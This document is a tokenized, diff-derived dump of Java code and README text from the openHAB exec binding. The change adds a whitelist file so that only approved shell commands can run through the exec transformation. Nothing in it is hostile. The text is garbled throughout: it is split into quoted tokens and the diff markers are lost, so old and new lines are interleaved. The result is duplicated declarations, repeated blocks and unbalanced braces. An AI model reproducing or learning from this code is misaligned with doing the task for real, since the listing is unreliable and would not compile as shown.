";", "}", "}", "catch", "(", "IllegalFormatException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "formatting", "the", "command", "line", "with", "the", "current", "time", "and", "input", "values", ":", "'", "{}", "'\"", ",", "e", ".", "getMessage", "(", "))", ";", "cmdArray", "=", "commandLine", ".", "split", "(", "CMD_LINE_DELIMITER", ")", ";", "}", "catch", "(", "PatternSyntaxException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "splitting", "'", "{}", "'", ":", "'", "{}", "'\"", ",", "commandLine", ",", "e", ".", "getMessage", "(", "))", ";", "updateState", "(", "RUN", ",", "OnOffType", ".", "OFF", ")", ";", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "e", ".", "getMessage", "(", "))", ");", "return", ";", "}", "String", "[", "]", "cmdArray", ";", "String", "[", "]", "shell", ";", "if", "(", "commandLine", ".", "contains", "(", "CMD_LINE_DELIMITER", ")", ")", "{", "logger", ".", "debug", "(", "\"", "Splitting", "by", "'", "{}", "'\"", ",", "CMD_LINE_DELIMITER", ")", ";", "try", "{", "cmdArray", "=", "commandLine", ".", "split", "(", "CMD_LINE_DELIMITER", ")", ";", "}", "catch", "(", "PatternSyntaxException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "splitting", "'", "{}", "'", ":", "'", "{}", "'\"", ",", "commandLine", ",", "e", ".", "getMessage", "(", "))", ";", "}", "else", "{", "/", "/", "Invoke", "shell", "with", "'", "c", "'", "option", "and", "pass", "string", "logger", ".", "debug", "(", "\"", "Passing", "to", "shell", "for", "parsing", "command", ".", "\")", ";", "switch", "(", "getOperatingSystemType", "(", "))", "{", "case", "WINDOWS", ":", "shell", "=", "SHELL_WINDOWS", ";", "logger", ".", "debug", "(", "\"", "OS", ":", "WINDOWS", "(", "{}", ")\"", ",", "getOperatingSystemName", "(", "))", ";", "cmdArray", "=", "createCmdArray", "(", "shell", ",", "\"", "/", "c", "\"", ",", "commandLine", ")", ";", "break", ";", "case", "LINUX", ":", "case", "MAC", ":", "case", "SOLARIS", ":", "/", "/", "assume", "sh", "is", "present", ",", "should", "all", "be", "POSIX", "-", "compliant", "shell", "=", "SHELL_NIX", ";", "logger", ".", "debug", "(", "\"", "OS", ":", "*", "NIX", "(", "{}", ")\"", ",", "getOperatingSystemName", "(", "))", ";", "cmdArray", "=", "createCmdArray", "(", "shell", ",", "\"", "-", "c", "\"", ",", "commandLine", ")", ";", "break", ";", "default", ":", "logger", ".", "debug", "(", "\"", "OS", ":", "Unknown", "(", "{}", ")\"", ",", "getOperatingSystemName", "(", "))", ";", "logger", ".", "warn", "(", "\"", "OS", "{", "}", "not", "supported", ",", "please", "manually", "split", "commands", "!", "\",", "getOperatingSystemName", "(", "))", ";", "updateState", "(", "RUN", ",", "OnOffType", ".", "OFF", ")", ";", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "e", ".", "getMessage", "(", "))", ");", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "\"", "OS", "not", "supported", ",", "please", "manually", "split", "commands", "!", "\")", ");", "return", ";", "}", "}", "else", "{", "/", "/", "Invoke", "shell", "with", "'", "c", "'", "option", "and", "pass", "string", "logger", ".", "debug", "(", "\"", "Passing", "to", "shell", "for", "parsing", "command", ".", "\")", ";", "switch", "(", "getOperatingSystemType", "(", "))", "{", "case", "WINDOWS", ":", "shell", "=", "SHELL_WINDOWS", ";", "logger", ".", "debug", "(", "\"", "OS", ":", "WINDOWS", "(", "{}", ")\"", ",", "getOperatingSystemName", "(", "))", ";", "cmdArray", "=", "createCmdArray", "(", "shell", ",", "\"", "/", "c", "\"", ",", "commandLine", ")", ";", "break", ";", "case", "LINUX", ":", "case", "MAC", ":", "case", "SOLARIS", ":", "/", "/", "assume", "sh", "is", "present", ",", "should", "all", "be", "POSIX", "-", "compliant", "shell", "=", "SHELL_NIX", ";", "logger", ".", "debug", "(", "\"", "OS", ":", "*", "NIX", "(", "{}", ")\"", ",", "getOperatingSystemName", "(", "))", ";", "cmdArray", "=", "createCmdArray", "(", "shell", ",", "\"", "-", "c", "\"", ",", "commandLine", ")", ";", "default", ":", "logger", ".", "debug", "(", "\"", "OS", ":", "Unknown", "(", "{}", ")\"", ",", "getOperatingSystemName", "(", "))", ";", "logger", ".", "warn", "(", "\"", "OS", "{", "}", "not", "supported", ",", "please", "manually", "split", "commands", "!", "\",", "getOperatingSystemName", "(", "))", ";", "updateState", "(", "RUN", ",", "OnOffType", ".", "OFF", ")", ";", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "\"", "OS", "not", "supported", ",", "please", "manually", "split", "commands", "!", "\")", ");", "return", ";", "}", "}", "}", "if", "(", "cmdArray", ".", "length", "=", "=", "0", ")", "{", "logger", ".", "trace", "(", "\"", "Empty", "command", "received", ",", "not", "executing", "\"", ");", "return", ";", "}", "if", "(", "cmdArray", ".", "length", "=", "=", "0", ")", "{", "logger", ".", "trace", "(", "\"", "Empty", "command", "received", ",", "not", "executing", "\"", ");", "return", ";", "}", "logger", ".", "trace", "(", "\"", "The", "command", "to", "be", "executed", "will", "be", "'", "{}", "'\"", ",", "Arrays", ".", "asList", "(", "cmdArray", ")", ");", "logger", ".", "trace", "(", "\"", "The", "command", "to", "be", "executed", "will", "be", "'", "{}", "'\"", ",", "Arrays", ".", "asList", "(", "cmdArray", ")", ");", "Process", "proc", "=", "null", ";", "try", "{", "proc", "=", "rt", ".", "exec", "(", "cmdArray", ")", ";", "}", "catch", "(", "Exception", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "executing", "'", "{}", "'", ":", "'", "{}", "'\"", ",", "Arrays", ".", "asList", "(", "cmdArray", ")", ",", "e", ".", "getMessage", "(", "))", ";", "updateState", "(", "RUN", ",", "OnOffType", ".", "OFF", ")", ";", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "e", ".", "getMessage", "(", "))", ");", "return", ";", "}", "Process", "proc", ";", "try", "{", "proc", "=", "rt", ".", "exec", "(", "cmdArray", ")", ";", "}", "catch", "(", "Exception", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "executing", "'", "{}", "'", ":", "'", "{}", "'\"", ",", "Arrays", ".", "asList", "(", "cmdArray", ")", ",", "e", ".", "getMessage", "(", "))", ";", "updateState", "(", "RUN", ",", "OnOffType", ".", "OFF", ")", ";", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "e", ".", "getMessage", "(", "))", ");", "return", ";", "}", "StringBuilder", "outputBuilder", "=", "new", "StringBuilder", "(", ");", "StringBuilder", "errorBuilder", "=", "new", "StringBuilder", "(", ");", "StringBuilder", "outputBuilder", "=", "new", "StringBuilder", "(", ");", "StringBuilder", "errorBuilder", "=", "new", "StringBuilder", "(", ");", "try", "(", "InputStreamReader", "isr", "=", "new", "InputStreamReader", "(", "proc", ".", "getInputStream", "(", "))", ";", "BufferedReader", "br", "=", "new", "BufferedReader", "(", "isr", ")", ")", "{", "String", "line", "=", "null", ";", "while", "(", "(", "line", "=", "br", ".", "readLine", "(", "))", "!", "=", "null", ")", "{", "outputBuilder", ".", "append", "(", "line", ")", ".", "append", "(", "\"\\", "n", "\"", ");", "logger", ".", "debug", "(", "\"", "Exec", "[", "{}", "]:", "'", "{}", "'\"", ",", "\"", "OUTPUT", "\"", ",", "line", ")", ";", "}", "isr", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "reading", "the", "stdout", "when", "executing", "'", "{}", "'", ":", "'", "{}", "'\"", ",", "commandLine", ",", "e", ".", "getMessage", "(", "))", ";", "try", "(", "InputStreamReader", "isr", "=", "new", "InputStreamReader", "(", "proc", ".", "getInputStream", "(", "))", ";", "BufferedReader", "br", "=", "new", "BufferedReader", "(", "isr", ")", ")", "{", "String", "line", ";", "while", "(", "(", "line", "=", "br", ".", "readLine", "(", "))", "!", "=", "null", ")", "{", "outputBuilder", ".", "append", "(", "line", ")", ".", "append", "(", "\"\\", "n", "\"", ");", "logger", ".", "debug", "(", "\"", "Exec", "[", "{}", "]:", "'", "{}", "'\"", ",", "\"", "OUTPUT", "\"", ",", "line", ")", ";", "}", "}", "catch", "(", "IOException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "reading", "the", "stdout", "when", "executing", "'", "{}", "'", ":", "'", "{}", "'\"", ",", "commandLine", ",", "e", ".", "getMessage", "(", "))", ";", "}", "try", "(", "InputStreamReader", "isr", "=", "new", "InputStreamReader", "(", "proc", ".", "getErrorStream", "(", "))", ";", "BufferedReader", "br", "=", "new", "BufferedReader", "(", "isr", ")", ")", "{", "String", "line", "=", "null", ";", "while", "(", "(", "line", "=", "br", ".", "readLine", "(", "))", "!", "=", "null", ")", "{", "errorBuilder", ".", "append", "(", "line", ")", ".", "append", "(", "\"\\", "n", "\"", ");", "logger", ".", "debug", "(", "\"", "Exec", "[", "{}", "]:", "'", "{}", "'\"", ",", "\"", "ERROR", "\"", ",", "line", ")", ";", "}", "isr", ".", "close", "(", ");", "}", "catch", "(", "IOException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "reading", "the", "stderr", "when", "executing", "'", "{}", "'", ":", "'", "{}", "'\"", ",", "commandLine", ",", "e", ".", "getMessage", "(", "))", ";", "try", "(", "InputStreamReader", "isr", "=", "new", "InputStreamReader", "(", "proc", ".", "getErrorStream", "(", "))", ";", "BufferedReader", "br", "=", "new", "BufferedReader", "(", "isr", ")", ")", "{", "String", "line", ";", "while", "(", "(", "line", "=", "br", ".", "readLine", "(", "))", "!", "=", "null", ")", "{", "errorBuilder", ".", "append", "(", "line", ")", ".", "append", "(", "\"\\", "n", "\"", ");", "logger", ".", "debug", "(", "\"", "Exec", "[", "{}", "]:", "'", "{}", "'\"", ",", "\"", "ERROR", "\"", ",", "line", ")", ";", "}", "}", "catch", "(", "IOException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "reading", "the", "stderr", "when", "executing", "'", "{}", "'", ":", "'", "{}", "'\"", ",", "commandLine", ",", "e", ".", "getMessage", "(", "))", ";", "}", "boolean", "exitVal", "=", "false", ";", "try", "{", "exitVal", "=", "proc", ".", "waitFor", "(", "timeOut", ",", "TimeUnit", ".", "MILLISECONDS", ")", ";", "}", "catch", "(", "InterruptedException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "waiting", "for", "the", "process", "(", "'{", "}'", ")", "to", "finish", ":", "'", "{}", "'\"", ",", "commandLine", ",", "e", ".", "getMessage", "(", "))", ";", "}", "boolean", "exitVal", "=", "false", ";", "try", "{", "exitVal", "=", "proc", ".", "waitFor", "(", "timeOut", ",", "TimeUnit", ".", "MILLISECONDS", ")", ";", "}", "catch", "(", "InterruptedException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "waiting", "for", "the", "process", "(", "'{", "}'", ")", "to", "finish", ":", "'", "{}", "'\"", ",", "commandLine", ",", "e", ".", "getMessage", "(", "))", ";", "}", "if", "(", "!", "exitVal", ")", "{", "logger", ".", "warn", "(", "\"", "Forcibly", "termininating", "the", "process", "(", "'{", "}'", ")", "after", "a", "timeout", "of", "{", "}", "ms", "\"", ",", "commandLine", ",", "timeOut", ")", ";", "proc", ".", "destroyForcibly", "(", ");", "}", "if", "(", "!", "exitVal", ")", "{", "logger", ".", "warn", "(", "\"", "Forcibly", "termininating", "the", "process", "(", "'{", "}'", ")", "after", "a", "timeout", "of", "{", "}", "ms", "\"", ",", "commandLine", ",", "timeOut", ")", ";", "proc", ".", "destroyForcibly", "(", ");", "}", "updateState", "(", "RUN", ",", "OnOffType", ".", "OFF", ")", ";", "updateState", "(", "EXIT", ",", "new", "DecimalType", "(", "proc", ".", "exitValue", "(", "))", ");", "updateState", "(", "RUN", ",", "OnOffType", ".", "OFF", ")", ";", "updateState", "(", "EXIT", ",", "new", "DecimalType", "(", "proc", ".", "exitValue", "(", "))", ");", "outputBuilder", ".", "append", "(", "errorBuilder", ".", "toString", "(", "))", ";", "outputBuilder", ".", "append", "(", "errorBuilder", ".", "toString", "(", "))", ";", "outputBuilder", ".", "append", "(", "errorBuilder", ".", "toString", "(", "))", ";", "outputBuilder", ".", "append", "(", "errorBuilder", ".", "toString", "(", "))", ";", "String", "transformedResponse", "=", "StringUtils", ".", "chomp", "(", "outputBuilder", ".", "toString", "(", "))", ";", "String", "transformation", "=", "(", "String", ")", "getConfig", "(", ").", "get", "(", "TRANSFORM", ")", ";", "String", "transformedResponse", "=", "StringUtils", ".", "chomp", "(", "outputBuilder", ".", "toString", "(", "))", ";", "String", "transformation", "=", "(", "String", ")", "getConfig", "(", ").", "get", "(", "TRANSFORM", ")", ";", "if", "(", "transformation", "!", "=", "null", "&", "&", "transformation", ".", "length", "(", ")", ">", "0", ")", "{", "transformedResponse", "=", "transformResponse", "(", "transformedResponse", ",", "transformation", ")", ";", "}", "if", "(", "transformation", "!", "=", "null", "&", "&", "transformation", ".", "length", "(", ")", ">", "0", ")", "{", "transformedResponse", "=", "transformResponse", "(", "transformedResponse", ",", "transformation", ")", ";", "}", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "transformedResponse", ")", ");", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "transformedResponse", ")", ");", "DateTimeType", "stampType", "=", "new", "DateTimeType", "(", "ZonedDateTime", ".", "now", "(", "))", ";", "updateState", "(", "LAST_EXECUTION", ",", "stampType", ")", ";", "}", "DateTimeType", "stampType", "=", "new", "DateTimeType", "(", "ZonedDateTime", ".", "now", "(", "))", ";", "updateState", "(", "LAST_EXECUTION", ",", "stampType", ")", ";", "}", "}", ";", "}", "protected", "@", "Nullable", "String", "transformResponse", "(", "String", "response", ",", "String", "transformation", ")", "{", "String", "transformedResponse", ";", "@", "@", "-", "311", ",", "8", "+", "309", ",", "8", "@", "@", "public", "void", "run", "(", ")", "{", "String", "transformationType", "=", "parts", "[", "0", "]", ";", "String", "transformationFunction", "=", "parts", "[", "1", "]", ";", "TransformationService", "transformationService", "=", "TransformationHelper", ".", "getTransformationService", "(", "bundleContext", ",", "transformationType", ")", ";", "TransformationService", "transformationService", "=", "TransformationHelper", ".", "getTransformationService", "(", "bundleContext", ",", "transformationType", ")", ";", "if", "(", "transformationService", "!", "=", "null", ")", "{", "transformedResponse", "=", "transformationService", ".", "transform", "(", "transformationFunction", ",", "response", ")", ";", "}", "else", "{", "@", "@", "-", "343", ",", "8", "+", "341", ",", "8", "@", "@", "public", "void", "run", "(", ")", "{", "Matcher", "matcher", "=", "EXTRACT_FUNCTION_PATTERN", ".", "matcher", "(", "transformation", ")", ";", "if", "(", "!", "matcher", ".", "matches", "(", "))", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "given", "transformation", "function", "'", "\"", "+", "transformation", "+", "\"", "'", "does", "not", "follow", "the", "expected", "pattern", "'", "<", "function", ">", "(<", "pattern", ">", ")'", "\")", ";", "throw", "new", "IllegalArgumentException", "(", "\"", "given", "transformation", "function", "'", "\"", "+", "transformation", "+", "\"", "'", "does", "not", "follow", "the", "expected", "pattern", "'", "<", "function", ">", "(<", "pattern", ">", ")'", "\")", ";", "}", "matcher", ".", "reset", "(", ");", "@", "@", "-", "361", ",", "8", "+", "359", ",", "8", "@", "@", "public", "void", "run", "(", ")", "{", "*", "or", "(", "if", "command", "already", "starts", "with", "one", "of", "the", "shells", ")", "splits", "by", "space", ".", "*", "*", "@", "param", "shell", "(", "path", ")", ",", "picks", "to", "first", "one", "to", "execute", "the", "command", "*", "@", "param", "\"", "c", "\"", "-", "option", "string", "*", "@", "param", "command", "to", "execute", "*", "@", "param", "cOption", "\"", "c", "\"", "-", "option", "string", "*", "@", "param", "commandLine", "to", "execute", "*", "@", "return", "command", "array", "*", "/", "protected", "String", "[", "]", "createCmdArray", "(", "String", "[", "]", "shell", ",", "String", "cOption", ",", "String", "commandLine", ")", "{", "@", "@", "-", "396", ",", "13", "+", "394", ",", "8", "@", "@", "public", "void", "run", "(", ")", "{", "*", "@", "author", "Constantin", "Piber", "(", "for", "Memin", ")", "-", "Initial", "contribution", "*", "/", "public", "enum", "OS", "{", "WINDOWS", ",", "LINUX", ",", "MAC", ",", "SOLARIS", ",", "UNKNOWN", ",", "NOT_SET", "}", ";", "WINDOWS", ",", "LINUX", ",", "MAC", ",", "SOLARIS", ",", "UNKNOWN", ",", "NOT_SET", "}", "private", "static", "OS", "os", "=", "OS", ".", "NOT_SET", ";", "@", "@", "-", "7", ",", "6", "+", "7", ",", "18", "@", "@", "In", "the", "given", "command", "line", "the", "placeholder", "`", "%", "s", "`", "is", "substituted", "with", "the", "input", "val", "The", "external", "program", "must", "either", "be", "in", "the", "executable", "search", "path", "of", "the", "server", "process", ",", "or", "an", "absolute", "path", "has", "to", "be", "used", ".", "For", "security", "reasons", "all", "commands", "need", "to", "be", "whitelisted", ".", "Allowed", "commands", "need", "to", "be", "added", "to", "the", "`", "misc", "/", "exec", ".", "whitelist", "`", "file", "in", "the", "configuration", "directory", ".", "Every", "command", "needs", "to", "be", "on", "a", "separate", "line", ".", "Example", ":", "`", "``", "shell", "/", "bin", "/", "date", "-", "v1d", "-", "v", "+", "1m", "-", "v", "-", "1d", "-", "v", "-", "%", "s", "numfmt", "-", "-", "to", "=", "iec", "-", "i", "-", "-", "suffix", "=", "B", "-", "-", "padding", "=", "7", "%", "s", "`", "``", "#", "#", "Examples", "#", "##", "General", "Setup", "@", "@", "-", "51", ",", "7", "+", "63", ",", "7", "@", "@", "Or", "replace", "it", "with", "numfmt", "-", "-", "to", "=", "iec", "-", "i", "-", "-", "suffix", "=", "B", "-", "-", "padding", "=", "7", "%", "s", "`", "``", "When", "the", "input", "argument", "for", "`", "%", "s", "`", "is", "1234567", "it", "will", "return", "the", "bytes", "formated", "in", "a", "better", "readable", "form", "When", "the", "input", "argument", "for", "`", "%", "s", "`", "is", "1234567", "it", "will", "return", "the", "bytes", "formatted", "in", "a", "better", "readable", "form", "`", "``", "shell", "1", ".", "2MiB", "@", "@", "-", "17", ",", "35", "+", "17", ",", "46", "@", "@", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "transform", ".", "TransformationException", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "transform", ".", "TransformationService", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "io", ".", "net", ".", "exec", ".", "ExecUtil", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Activate", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Component", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Reference", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "/", "**", "*", "The", "implementation", "of", "{", "@", "link", "TransformationService", "}", "which", "transforms", "the", "*", "input", "by", "command", "line", ".", "*", "*", "@", "author", "Pauli", "Anttila", "*", "@", "author", "Pauli", "Anttila", "-", "Initial", "contribution", "*", "@", "author", "Jan", "N", ".", "Klug", "-", "added", "command", "whitelist", "service", "*", "/", "@", "NonNullByDefault", "@", "Component", "(", "immediate", "=", "true", ",", "property", "=", "{", "\"", "smarthome", ".", "transform", "=", "EXEC", "\"", "}", ")", "public", "class", "ExecTransformationService", "implements", "TransformationService", "{", "private", "final", "Logger", "logger", "=", "LoggerFactory", ".", "getLogger", "(", "ExecTransformationService", ".", "class", ")", ";", "private", "final", "ExecTransformationWhitelistWatchService", "execTransformationWhitelistWatchService", ";", "@", "Activate", "public", "ExecTransformationService", "(", "@", "Reference", "ExecTransformationWhitelistWatchService", "execTransformationWhitelistWatchService", ")", "{", "this", ".", "execTransformationWhitelistWatchService", "=", "execTransformationWhitelistWatchService", ";", "}", "/", "**", "*", "Transforms", "the", "input", "<", "code", ">", "source", "<", "/", "code", ">", "by", "the", "command", "line", ".", "*", "*", "@", "param", "commandLine", "the", "command", "to", "execute", ".", "Command", "line", "should", "contain", "%", "s", "string", ",", "*", "which", "will", "be", "replaced", "by", "the", "input", "data", ".", "*", "@", "param", "source", "the", "input", "to", "transform", "*", "@", "param", "commandLine", "the", "command", "to", "execute", ".", "Command", "line", "should", "contain", "%", "s", "string", ",", "which", "will", "be", "replaced", "by", "the", "input", "data", ".", "*", "@", "param", "source", "the", "input", "to", "transform", "*", "/", "@", "Override", "public", "@", "Nullable", "String", "transform", "(", "String", "commandLine", ",", "String", "source", ")", "throws", "TransformationException", "{", "if", "(", "commandLine", "=", "=", "null", "|", "|", "source", "=", "=", "null", ")", "{", "throw", "new", "TransformationException", "(", "\"", "the", "given", "parameters", "'", "commandLine", "'", "and", "'", "source", "'", "must", "not", "be", "null", "\"", ");", "}", "if", "(", "!", "execTransformationWhitelistWatchService", ".", "isWhitelisted", "(", "commandLine", ")", ")", "{", "logger", ".", "warn", "(", "\"", "Tried", "to", "execute", "'", "{}", "',", "but", "it", "is", "not", "contained", "in", "whitelist", ".", "\",", "commandLine", ")", ";", "return", "null", ";", "}", "logger", ".", "debug", "(", "\"", "about", "to", "transform", "'", "{}", "'", "by", "the", "commandline", "'", "{}", "'\"", ",", "source", ",", "commandLine", ")", ";", "long", "startTime", "=", "System", ".", "currentTimeMillis", "(", ");", "@", "@", "-", "56", ",", "5", "+", "67", ",", "4", "@", "@", "return", "result", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "81", "@", "@", "/", "**", "*", "Copyright", "(", "c", ")", "2010", "-", "2020", "Contributors", "to", "the", "openHAB", "project", "*", "*", "See", "the", "NOTICE", "file", "(", "s", ")", "distributed", "with", "this", "work", "for", "additional", "*", "information", ".", "*", "*", "This", "program", "and", "the", "accompanying", "materials", "are", "made", "available", "under", "the", "*", "terms", "of", "the", "Eclipse", "Public", "License", "2", ".", "0", "which", "is", "available", "at", "*", "http", ":", "//", "www", ".", "eclipse", ".", "org", "/", "legal", "/", "epl", "-", "2", ".", "0", "*", "*", "SPDX", "-", "License", "-", "Identifier", ":", "EPL", "-", "2", ".", "0", "*", "/", "package", "org", ".", "openhab", ".", "transform", ".", "exec", ".", "internal", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "NonNullByDefault", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "Nullable", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "config", ".", "core", ".", "ConfigConstants", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "service", ".", "AbstractWatchService", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Activate", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Component", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "Path", ";", "import", "java", ".", "nio", ".", "file", ".", "WatchEvent", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "static", "java", ".", "nio", ".", "file", ".", "StandardWatchEventKinds", ".", "*;", "/", "**", "*", "The", "{", "@", "link", "ExecTransformationWhitelistWatchService", "}", "provides", "a", "whitelist", "check", "for", "exec", "commands", "*", "*", "@", "author", "Jan", "N", ".", "Klug", "-", "Initial", "contribution", "*", "/", "@", "Component", "(", "service", "=", "ExecTransformationWhitelistWatchService", ".", "class", ")", "@", "NonNullByDefault", "public", "class", "ExecTransformationWhitelistWatchService", "extends", "AbstractWatchService", "{", "private", "static", "final", "String", "COMMAND_WHITELIST_PATH", "=", "ConfigConstants", ".", "getConfigFolder", "(", ")", "+", "File", ".", "separator", "+", "\"", "misc", "\"", ";", "private", "static", "final", "String", "COMMAND_WHITELIST_FILE", "=", "\"", "exec", ".", "whitelist", "\"", ";", "private", "final", "Set", "<", "String", ">", "commandWhitelist", "=", "new", "HashSet", "<", ">(", ");", "@", "Activate", "public", "ExecTransformationWhitelistWatchService", "(", ")", "{", "super", "(", "COMMAND_WHITELIST_PATH", ")", ";", "}", "@", "Override", "protected", "boolean", "watchSubDirectories", "(", ")", "{", "return", "false", ";", "}", "@", "Override", "protected", "WatchEvent", ".", "Kind", "<", "?>", "[]", "getWatchEventKinds", "(", "@", "Nullable", "Path", "directory", ")", "{", "return", "new", "WatchEvent", ".", "Kind", "<", "?>", "[]", "{", "ENTRY_CREATE", ",", "ENTRY_DELETE", ",", "ENTRY_MODIFY", "}", ";", "}", "@", "Override", "protected", "void", "processWatchEvent", "(", "@", "Nullable", "WatchEvent", "<", "?>", "event", ",", "WatchEvent", ".", "@", "Nullable", "Kind", "<", "?>", "kind", ",", "@", "Nullable", "Path", "path", ")", "{", "if", "(", "path", ".", "endsWith", "(", "COMMAND_WHITELIST_FILE", ")", ")", "{", "commandWhitelist", ".", "clear", "(", ");", "try", "{", "Files", ".", "lines", "(", "path", ")", ".", "forEach", "(", "commandWhitelist", ":", ":", "add", ")", ";", "logger", ".", "debug", "(", "\"", "Updated", "command", "whitelist", ":", "{", "}\"", ",", "commandWhitelist", ")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "Cannot", "read", "whitelist", "file", ",", "exec", "transformations", "won", "'", "t", "be", "processed", ":", "{", "}\"", ",", "e", ".", "getMessage", "(", "))", ";", "}", "}", "}", "/", "**", "*", "Check", "if", "a", "command", "is", "whitelisted", "*", "*", "@", "param", "command", "the", "command", "to", "check", "alias", "*", "@", "return", "true", "if", "whitelisted", ",", "false", "if", "not", "*", "/", "public", "boolean", "isWhitelisted", "(", "String", "command", ")", "{", "return", "commandWhitelist", ".", "contains", "(", "command", ")", ";", "}", "}", "@", "@", "-", "13", ",", "6", "+", "13", ",", "7", "@", "@", "package", "org", ".", "openhab", ".", "transform", ".", "exec", ".", "internal", ".", "profiles", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "NonNullByDefault", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "Nullable", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "library", ".", "types", ".", "StringType", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "thing", ".", "profiles", ".", "ProfileCallback", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "thing", ".", "profiles", ".", "ProfileContext", ";", "@", "@", "-", "31", ",", "7", "+", "32", ",", "6", "@", "@", "*", "Profile", "to", "offer", "the", "ExecTransformationservice", "on", "a", "ItemChannelLink", "*", "*", "@", "author", "Stefan", "Triller", "-", "initial", "contribution", "*", "*", "/", "@", "NonNullByDefault", "public", "class", "ExecTransformationProfile", "implements", "StateProfile", "{", "@", "@", "-", "47", ",", "10", "+", "47", ",", "8", "@", "@", "private", "static", "final", "String", "FUNCTION_PARAM", "=", "\"", "function", "\"", ";", "private", "static", "final", "String", "SOURCE_FORMAT_PARAM", "=", "\"", "sourceFormat", "\"", ";", "@", "NonNullByDefault", "(", "{}", ")", "private", "final", "String", "function", ";", "@", "NonNullByDefault", "(", "{}", ")", "private", "final", "String", "sourceFormat", ";", "private", "@", "Nullable", "String", "function", ";", "private", "@", "Nullable", "String", "sourceFormat", ";", "public", "ExecTransformationProfile", "(", "ProfileCallback", "callback", ",", "ProfileContext", "context", ",", "TransformationService", "service", ")", "{", "this", ".", "service", "=", "service", ";", "@", "@", "-", "61", ",", "6", "+", "59", ",", "7", "@", "@", "public", "ExecTransformationProfile", "(", "ProfileCallback", "callback", ",", "ProfileContext", "contex", "logger", ".", "debug", "(", "\"", "Profile", "configured", "with", "'", "{}", "'=", "'{", "}'", ",", "'", "{}", "'=", "{}", "\",", "FUNCTION_PARAM", ",", "paramFunction", ",", "SOURCE_FORMAT_PARAM", ",", "paramSource", ")", ";", "/", "/", "SOURCE_FORMAT_PARAM", "is", "an", "advanced", "parameter", "and", "we", "assume", "\"", "%", "s", "\"", "if", "it", "is", "not", "set", "if", "(", "paramSource", "=", "=", "null", ")", "{", "paramSource", "=", "\"", "%", "s", "\"", ";", "@", "@", "-", "117", ",", "11", "+", "116", ",", "19", "@", "@", "public", "void", "onStateUpdateFromHandler", "(", "State", "state", ")", "{", "private", "Type", "transformState", "(", "Type", "state", ")", "{", "String", "result", "=", "state", ".", "toFullString", "(", ");", "try", "{", "result", "=", "TransformationHelper", ".", "transform", "(", "service", ",", "function", ",", "sourceFormat", ",", "state", ".", "toFullString", "(", "))", ";", "}", "catch", "(", "TransformationException", "e", ")", "{", "String", "function", "=", "this", ".", "function", ";", "String", "sourceFormat", "=", "this", ".", "sourceFormat", ";", "if", "(", "function", "=", "=", "null", "|", "|", "sourceFormat", "=", "=", "null", ")", "{", "logger", ".", "warn", "(", "\"", "Could", "not", "transform", "state", "'", "{}", "'", "with", "function", "'", "{}", "'", "and", "format", "'", "{}", "'\"", ",", "state", ",", "function", ",", "sourceFormat", ")", ";", "}", "else", "{", "try", "{", "result", "=", "TransformationHelper", ".", "transform", "(", "service", ",", "function", ",", "sourceFormat", ",", "state", ".", "toFullString", "(", "))", ";", "}", "catch", "(", "TransformationException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "Could", "not", "transform", "state", "'", "{}", "'", "with", "function", "'", "{}", "'", "and", "format", "'", "{}", "'\"", ",", "state", ",", "function", ",", "sourceFormat", ")", ";", "}", "}", "StringType", "resultType", "=", "new", "StringType", "(", "result", ")", ";", "logger", ".", "debug", "(", "\"", "Transformed", "'", "{}", "'", "into", "'", 